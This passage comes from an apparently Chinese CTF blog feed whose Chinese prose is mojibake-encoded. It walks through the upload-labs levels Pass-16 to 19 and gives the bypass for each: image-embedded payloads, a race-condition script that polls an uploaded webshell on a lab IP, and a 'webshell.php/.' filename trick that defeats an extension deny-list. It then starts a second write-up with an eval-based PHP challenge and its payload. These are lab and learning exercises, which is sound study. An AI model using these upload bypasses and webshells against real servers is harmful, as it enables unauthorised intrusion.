class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å‘½ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpg_payload.php <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure><h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•ä¸€-1"><a href="#æ–¹æ³•ä¸€-1" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><p>è¿™ç§è¿‡æ»¤æ–¹æ³•æ˜¯æ¡ä»¶ç­›é€‰ï¼Œå…ˆä¸Šä¼ æ–‡ä»¶ï¼Œå¦‚æœä¸ç¬¦åˆæ ¼å¼å†å°†æ–‡ä»¶åˆ é™¤ã€‚æ‰€ä»¥å¯ä»¥åœ¨æ–‡ä»¶æ²¡è¢«åˆ é™¤æ—¶è®¿é—®å³å¯ï¼Œåˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®æ‰§è¡Œï¼Œä½†æ˜¯æ—¶é—´å·®å¾ˆçŸ­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨è„šæœ¬è®¿é—®ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.31.88/upload-labs/upload/webshell.jpg&quot;</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    html = requests.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•äºŒ-2"><a href="#æ–¹æ³•äºŒ-2" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>å°†ä¸Šä¼ é¡µé¢å’Œæ–‡ä»¶åŒ…å«è§¦å‘æ¼æ´é¡µé¢å‘é€åˆ°Burpçš„intruderï¼Œç„¶åpayloadè®¾ç½®ä¸ºnullï¼Œå³å¯è§¦å‘æ¡ä»¶ç«äº‰æ¼æ´</p><h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$UPLOAD_ADDR</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•ä¸€-2"><a href="#æ–¹æ³•ä¸€-2" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><p>ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ï¼Œå¯ä»¥åœ¨è¿”å›é¡µé¢ä¸­å¾—åˆ°å›¾ç‰‡åç§°</p><h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-14"><a href="#è§£æ³•-14" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p><code>move_uploaded_file</code>è¿™ä¸ªå‡½æ•°ä¼šå¿½ç•¥<code>/</code>ï¼Œå› æ­¤å¯ä»¥ä¿®æ”¹ä¸Šä¼ çš„æ–‡ä»¶åä¸ºï¼š<code>webshell.php/.</code>å³å¯æˆåŠŸä¸Šä¼ ï¼Œæµ‹è¯•è¿æ¥æˆåŠŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é»„æ²³æµåŸŸå…¬å®‰é™¢æ ¡ç½‘ç»œç©ºé—´å®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›WP</title>
      <link href="/2023/03/12/%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E9%99%A2%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWP/"/>
      <url>/2023/03/12/%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E9%99%A2%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<blockquote><p>WPåŸæ–‡ï¼š<a href="https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg#">https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg#</a></p></blockquote><blockquote><p>å°±åšå‡ºæ¥äº†ä¸€ä¸ªezphpï¼Œè€Œä¸”è¿˜æ˜¯é googleåŸé¢˜å—¯æŠ„çš„ï¼Œå­¦ä¹ ä¹‹è·¯çœŸæ˜¯ä»»é‡è€Œé“è¿œã€‚</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678004599199-79d1bc55-533b-463b-b116-f14a209b86d7.png" alt="9956ef16896bd6c730cea9b401218c2.png"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|\&quot;|\`| |&lt;|&gt;|?|\^|%|\$/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;nononno&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="string">&quot;return $&#123;num&#125; != 2;&quot;</span>) &amp;&amp; <span class="variable">$num</span> == <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) != <span class="literal">true</span>) &#123;</span><br><span class="line"> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ä¸»è¦è€ƒå¯Ÿçš„æ˜¯phpçš„è¿ç®—ç¬¦çš„æ¯”è¾ƒçº§ã€‚<br>payloadï¼š<code>?num=1|2</code><br>flagåœ¨æºä»£ç é‡Œé¢ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001464588-77225b4a-cf0b-4a51-8212-30b8bd77afa1.png" alt="image.png"></p><h2 id="funnyPHP"><a href="#funnyPHP" class="headerlink" title="funnyPHP"></a>funnyPHP</h2><p>ä¸Šæ¥ç»™å‡ºçš„åœ°å€æ˜¯ï¼š<code>/hint.php</code>ï¼Œé¡µé¢ä¸‹ä¸º<code>phpinfo()</code>å‚æ•°é¡µé¢ï¼š<br><img 